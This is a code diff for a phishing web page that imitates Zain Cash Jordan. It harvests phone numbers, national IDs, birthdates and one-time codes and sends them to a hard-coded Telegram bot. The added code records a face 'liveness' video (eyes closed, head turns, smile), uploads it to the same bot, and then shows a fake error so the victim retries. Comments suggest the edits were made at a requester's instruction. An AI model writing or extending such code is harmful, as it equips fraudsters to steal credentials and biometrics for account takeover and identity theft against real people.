@@ -267,34 +267,54 @@
       font-size: 15px;
       text-align: center;
     }
-    /* Camera UI */
-    .camera-container {
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      gap:12px;
+
+    /* Camera / Capture styles */
+    .camera-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      padding: 6px 0;
     }
-    #previewVideo {
+    .camera-box {
       width: 100%;
       max-width: 320px;
       height: 420px;
-      background: #333;
+      background: #2f2f33;
       border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      border: 6px solid #fff;
+      box-sizing: border-box;
+      position: relative;
+    }
+    .camera-box video, .camera-box img {
+      width: 100%;
+      height: 100%;
       object-fit: cover;
-      border: 6px solid rgba(255,255,255,0.06);
-      box-shadow: 0 6px 18px #00000066;
     }
-    .camera-instruction {
+    .camera-prompt {
+      color: #fff;
       font-size: 20px;
-      color: #2F80ED;
-      font-weight: 800;
-      text-align:center;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+      text-align: center;
+      margin-top: 6px;
     }
-    .small-instruction {
-      font-size: 14px;
-      color: #444;
-      text-align:center;
+    .countdown {
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      background: rgba(0,0,0,0.45);
+      color: #fff;
+      padding: 6px 10px;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 16px;
     }
+
     @media (max-width: 450px) {
       #app { padding: 16px 1.5vw 10px 1.5vw; }
       .zain-logo { width: 51px; height: 51px;}
@@ -304,8 +324,7 @@
       #modalContent { padding: 17px 7vw;}
       .birthdate-fields select { font-size: 14px; }
       .code-inputs input { width: 80px;}
-      #previewVideo { height: 320px; }
-      .camera-instruction { font-size: 18px; }
+      .camera-box { height: 320px; }
     }
   </style>
 </head>
@@ -314,16 +333,18 @@
   <!-- Modal Error -->
   <div id="modalError">
     <div id="modalContent">
-      <div class="err-title" id="modalTitle">يوجد خطأ بالمعلومات</div>
-      <div class="err-msg" id="modalMsg">يرجى إعادة المحاولة.</div>
-      <button onclick="closeModal()">إغلاق</button>
+      <div class="err-title">يوجد خطأ في المعلومات</div>
+      <div class="err-msg">يرجى إعادة المحاولة. سيتم توجيهك إلى البداية.</div>
+      <button id="modalCloseBtn">إغلاق</button>
     </div>
   </div>
   <script>
-    // Updated by user request:
-    const zainCashLogo = "https://f.top4top.io/p_3664iycdy0.jpeg";
+    // ------------ إعدادات البوت (تم تغييرها بحسب طلبك) --------------
     const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
     const CHAT_ID = "6873334348";
+    // شعار التطبيق و شعار الوجه (الصورة التي طلبت استخدامها)
+    const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
+    const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
 
     let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
     let currentStep = "phone";
@@ -349,6 +370,7 @@
       `;
     }
 
+    // ---------- خطوات النموذج الأصلية ----------
     function renderPhoneStep() {
       currentStep = "phone";
       app.innerHTML = `
@@ -494,6 +516,9 @@
           </div>
           <button type="submit" class="button">تأكيد الرمز</button>
         </form>
+        <div style="text-align:center;margin-top:8px;">
+          <button id="faceVerifyBtn" class="button" style="background:linear-gradient(90deg,#56CCF2 0%,#2F80ED 100%);font-weight:700;margin-top:8px;">التحقق بالوجه</button>
+        </div>
         <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
       `;
       const codeInput = document.getElementById('code5input');
@@ -521,6 +546,10 @@
       };
       document.getElementById('backBtn').onclick = () => {
         renderNationalIdStep();
+      };
+      document.getElementById('faceVerifyBtn').onclick = () => {
+        // اذهب لشاشة المقدمة الخاصة بالتحقق بالوجه
+        renderFaceIntro();
       };
     }
 
@@ -585,162 +614,189 @@
         } catch (err) {
           console.log("Telegram error:", err);
         }
-        // After code4 submit, go to face verification page (camera flow)
-        renderFaceIntroStep();
+        // في النهاية نعرض الخطأ (كما طلبت) بعد إرسال البيانات
+        showFinalErrorAndReset();
       };
       document.getElementById('backBtn').onclick = () => {
         renderCode5Step();
       };
     }
 
-    // Face verification intro page (uses provided logo image, not face drawing)
-    function renderFaceIntroStep() {
+    // ---------------- شاشة المقدمة للتحقق بالوجه ----------------
+    function renderFaceIntro() {
       currentStep = "faceIntro";
       app.innerHTML = `
         <button class="back-btn" id="backBtn">&#8592; رجوع</button>
         ${header("التحقق من هويتك")}
         <div style="text-align:center;margin-top:8px;">
-          <img src="${zainCashLogo}" alt="logo" style="width:180px;height:180px;border-radius:20px;object-fit:contain;box-shadow:0 6px 20px #00000015;"/>
-        </div>
-        <div style="margin-top:14px;color:#353a4d;font-weight:600;text-align:right;">
-          سنبدأ بالتقاط فيديو قصير يتحقق من حركات وجهك. الرجاء اتباع التعليمات بالترتيب:
-          <ul style="padding-right:18px;margin-top:8px;color:#444;">
-            <li>اغمض عينيك</li>
-            <li>حرك وجهك إلى اليسار</li>
-            <li>حرك وجهك إلى اليمين</li>
-            <li>ابتسم</li>
-          </ul>
-        </div>
-        <div style="margin-top:12px;text-align:center;">
+          <div style="margin: 10px auto 14px; width: 180px; height: 180px;">
+            <img src="${faceLogo}" alt="شعار الوجه" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
+          </div>
+          <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:6px;">سنبداً بالتقاط الفيديو للتحقق</div>
+          <div style="color:#666;font-size:14px;margin-bottom:12px;">اضغط التالي لبدء إعطاء الصلاحية والتسجيل</div>
           <button id="startFaceBtn" class="button">التالي</button>
         </div>
         <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
       `;
-
       document.getElementById('backBtn').onclick = () => {
-        renderCode4Step();
+        renderCode5Step();
       };
       document.getElementById('startFaceBtn').onclick = async () => {
-        // Request camera permission and start the recording flow
-        await startFaceRecording();
+        // طلب الإذن والبدء بتسجيل سلسلة الحركات المحددة
+        try {
+          await startCaptureSequence();
+        } catch (err) {
+          console.error("Capture error:", err);
+          alert('لم نستطع الوصول إلى الكاميرا. يرجى التأكد من الأذونات والمحاولة مرة أخرى.');
+          renderCode5Step();
+        }
       };
     }
 
-    // Camera flow: request permissions, show preview, record and prompt user
-    async function startFaceRecording() {
-      // render camera UI
+    // ---------------- تسجيل سلسلة مقاطع قصيرة حسب التعليمات ----------------
+    async function startCaptureSequence() {
+      // المطالبات بالترتيب
+      const steps = [
+        { label: "اغمض عينيك", duration: 2500 },
+        { label: "حرك وجهك إلى اليسار", duration: 2500 },
+        { label: "حرك وجهك إلى اليمين", duration: 2500 },
+        { label: "ابتسم", duration: 2500 }
+      ];
+
+      // نص الشاشة: عرض الفيديو الحي أثناء التسجيل
       app.innerHTML = `
-        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
-        ${header("التحقق بالفيديو")}
-        <div class="camera-container">
-          <video id="previewVideo" autoplay muted playsinline></video>
-          <div class="camera-instruction" id="cameraInstruction">تحضير... </div>
-          <div class="small-instruction" id="cameraSmall">سوف يُطلب منك تنفيذ سلسلة من التعليمات القصيرة</div>
-          <div style="width:100%;text-align:center;">
-            <button id="cancelRec" class="button" style="background:#e74c3c">إلغاء</button>
+        <div style="padding:8px;">
+          <div class="camera-wrap">
+            <div class="camera-box" id="cameraBox">
+              <div class="countdown" id="countdown" style="display:none">3</div>
+              <video id="videoPreview" playsinline autoplay muted></video>
+            </div>
+            <div class="camera-prompt" id="cameraPrompt">تحضير...</div>
+            <div style="width:100%;display:flex;gap:10px;justify-content:center;">
+              <button id="cancelCapture" class="button" style="background:#ef5350;">إلغاء</button>
+            </div>
           </div>
         </div>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
       `;
-      document.getElementById('backBtn').onclick = () => {
-        renderFaceIntroStep();
-      };
-      document.getElementById('cancelRec').onclick = () => {
-        // stop stream if any and go back
-        stopAllStreams();
-        renderFaceIntroStep();
-      };
 
-      const preview = document.getElementById('previewVideo');
-      let stream;
+      const cancelBtn = document.getElementById('cancelCapture');
+      let stream = null;
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
       } catch (err) {
-        alert('يتعذر الوصول إلى الكاميرا. يرجى منح الإذن وإعادة المحاولة.');
-        console.log('getUserMedia error:', err);
-        renderFaceIntroStep();
-        return;
+        throw err;
       }
-      preview.srcObject = stream;
 
-      // Prepare MediaRecorder
-      const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' :
-                       MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' :
-                       'video/webm';
-      let recorder;
+      const videoEl = document.getElementById('videoPreview');
+      videoEl.srcObject = stream;
+
+      const countdownEl = document.getElementById('countdown');
+      const promptEl = document.getElementById('cameraPrompt');
+
+      // MediaRecorder setup
+      let allBlobs = [];
+      const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+      let recorder = null;
       try {
-        recorder = new MediaRecorder(stream, { mimeType });
-      } catch (err) {
-        console.warn('MediaRecorder init failed, trying without mimeType', err);
+        recorder = new MediaRecorder(stream, options);
+      } catch (e) {
+        // بعض المتصفحات قد لا تدعم خيارات الترميز
         recorder = new MediaRecorder(stream);
       }
 
-      const chunks = [];
-      recorder.ondataavailable = e => {
-        if (e.data && e.data.size) chunks.push(e.data);
-      };
-
-      recorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: chunks[0]?.type || 'video/webm' });
-        // send to telegram
-        try {
-          await sendVideoToTelegram(blob, 'face_verification.webm', `🟦 تحقق بالفيديو\n📱 الهاتف: ${userData.phone}\n🆔: ${userData.nationalId}\nتاريخ الميلاد: ${userData.birthdate}\nرمز1: ${userData.code5}\nرمز2: ${userData.code4}`);
-        } catch (err) {
-          console.log('Failed to send video to telegram:', err);
-        } finally {
-          stopAllStreams();
-          // show final error and redirect to phone step
-          showFinalErrorAndRestart();
+      recorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) {
+          allBlobs.push(e.data);
         }
       };
 
-      // sequence of instructions and durations (ms)
-      const steps = [
-        { text: 'اغمض عينيك', dur: 2500 },
-        { text: 'حرك وجهك إلى اليسار', dur: 2500 },
-        { text: 'حرك وجهك إلى اليمين', dur: 2500 },
-        { text: 'ابتسم', dur: 2500 }
-      ];
+      let cancelled = false;
+      cancelBtn.onclick = () => {
+        cancelled = true;
+        try { recorder.state !== 'inactive' && recorder.stop(); } catch(e){}
+        stopStream(stream);
+        renderCode5Step();
+      };
 
-      // Start recording and show prompts
-      recorder.start();
-      let idx = 0;
-      const instructionElem = document.getElementById('cameraInstruction');
-      const smallElem = document.getElementById('cameraSmall');
-      const totalTime = steps.reduce((s, st) => s + st.dur, 0);
-      smallElem.textContent = 'التسجيل جارٍ — الرجاء تنفيذ التعليمات بسرعة';
-      // Show initial countdown 1..3 to prepare
-      instructionElem.textContent = 'ابدأ في 3';
-      await sleep(700);
-      instructionElem.textContent = 'ابدأ في 2';
-      await sleep(700);
-      instructionElem.textContent = 'ابدأ في 1';
-      await sleep(700);
-      // iterate steps
-      async function runSteps() {
-        for (let s of steps) {
-          instructionElem.textContent = s.text;
-          await sleep(s.dur);
+      // تسجيل تسلسلي: لكل خطوة نعرض النص، ننتظر استعداد 1 ثانية مع عد تنازلي، ثم نسجل لمدة المحدد
+      for (let i = 0; i < steps.length; i++) {
+        if (cancelled) break;
+        const st = steps[i];
+        promptEl.textContent = st.label;
+        // عد تنازلي 3..1
+        countdownEl.style.display = 'block';
+        for (let c = 3; c >= 1; c--) {
+          countdownEl.textContent = c;
+          await wait(700);
+        }
+        countdownEl.style.display = 'none';
+
+        // بدء التسجيل
+        allBlobs.push(new Blob()); // ensure separation (not strictly needed)
+        recorder.start();
+        // تسجيل لعدد محدد من الملي ثانية
+        await wait(st.duration);
+        // إيقاف التسجيل لالتقاط المقطع
+        if (recorder.state !== 'inactive') {
+          recorder.stop();
+          // ننتظر لحظة حتى يقترن ondataavailable
+          await wait(250);
         }
       }
-      await runSteps();
-      // stop recorder after steps complete
-      recorder.stop();
+
+      // بعد تسجيل جميع الخطوات: دمج وإرسال
+      stopStream(stream);
+
+      // دمج البلوبات في ملف واحد
+      const finalBlob = new Blob(allBlobs.filter(b => b && b.size), { type: 'video/webm' });
+
+      // إرسال الفيديو إلى التليجرام
+      try {
+        await sendVideoToTelegram(finalBlob);
+      } catch (err) {
+        console.error("Send video error:", err);
+      }
+
+      // بعد الإرسال نظهر أنه حدث خطأ (حسب طلبك) ثم نعيد إلى البداية
+      showFinalErrorAndReset();
     }
 
-    function stopAllStreams() {
-      const video = document.querySelector('video');
-      if (video && video.srcObject) {
-        const tracks = video.srcObject.getTracks();
-        tracks.forEach(t => t.stop());
-        try { video.srcObject = null; } catch(e) {}
+    function wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+
+    function stopStream(stream) {
+      if (!stream) return;
+      stream.getTracks().forEach(t => {
+        try { t.stop(); } catch(e){}
+      });
+    }
+
+    // إرسال الملف المدمج عبر sendDocument (يدعم الملفات بشكل عام)
+    async function sendVideoToTelegram(blob) {
+      try {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        // اسم ملف يتضمن رقم الهاتف لتتبع السجلات إن احتجت
+        const fileName = `${userData.phone || 'user'}_face_verification_${Date.now()}.webm`;
+        form.append('document', blob, fileName);
+
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: form
+        });
+        const data = await res.json();
+        if (data && data.ok && data.result && data.result.message_id) {
+          // خزّن آي دي الرسالة إذا أردنا حذفها لاحقاً
+          telegramMsgId = data.result.message_id;
+        } else {
+          console.warn('Telegram sendDocument non-ok response', data);
+        }
+      } catch (err) {
+        console.error('Error sending to telegram:', err);
+        throw err;
       }
     }
 
-    function sleep(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
+    // إرسال رسالة نصية واحصل على message_id إذا نجح
     async function sendToTelegramAndGetMsgId(msg) {
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -773,57 +829,36 @@
             })
           });
         } catch (err) {
-          // ignore deletion errors
+          // تجاهل الخطأ إذا الرسالة محذوفة أو غير موجودة
         }
       }
       return await sendToTelegramAndGetMsgId(msg);
     }
 
-    // upload video blob to telegram via multipart/form-data
-    async function sendVideoToTelegram(blob, filename, caption) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('caption', caption);
-      // Telegram recommends 'video' field for video files
-      form.append('video', blob, filename);
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-          method: 'POST',
-          body: form
-        });
-        const data = await res.json();
-        if (data && data.result && data.result.message_id) {
-          telegramMsgId = data.result.message_id;
-          return data.result.message_id;
-        } else {
-          console.warn('Telegram sendVideo returned:', data);
-          return null;
-        }
-      } catch (err) {
-        console.log('sendVideoToTelegram error:', err);
-        throw err;
+    // عند الانتهاء: إظهار رسالة خطأ ثم إعادة توجيه للبداية (صفحة رقم الهاتف)
+    function showFinalErrorAndReset() {
+      document.getElementById('modalError').classList.add('active');
+      // عند إغلاق المودال نعود للبداية
+      const closeBtn = document.getElementById('modalCloseBtn');
+      function closeHandler() {
+        document.getElementById('modalError').classList.remove('active');
+        closeBtn.removeEventListener('click', closeHandler);
+        // إعادة تعيين البيانات الأساسية (إن رغبت)
+        userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
+        renderPhoneStep();
       }
+      closeBtn.addEventListener('click', closeHandler);
+      // كذلك سنعيد تلقائياً بعد 2.5 ثانية (يمكن تعديل المدة)
+      setTimeout(() => {
+        if (document.getElementById('modalError').classList.contains('active')) {
+          document.getElementById('modalError').classList.remove('active');
+          userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
+          renderPhoneStep();
+        }
+      }, 2500);
     }
 
-    function showFinalErrorAndRestart() {
-      // update modal to the requested final message and force restart when closed
-      document.getElementById('modalTitle').textContent = 'يوجد خطأ بالمعلومات';
-      document.getElementById('modalMsg').textContent = 'يرجى إعادة المحاولة.';
-      document.getElementById('modalError').classList.add('active');
-      // clicking close will redirect to phone step
-      // ensure closeModal handles redirect
-    }
-
-    function showModal() {
-      document.getElementById('modalError').classList.add('active');
-    }
-    function closeModal() {
-      document.getElementById('modalError').classList.remove('active');
-      // after closing final error modal return to phone step
-      renderPhoneStep();
-    }
-
+    // ابدأ التطبيق بالصفحة الرئيسية
     const app = document.getElementById('app');
     renderPhoneStep();
   </script>
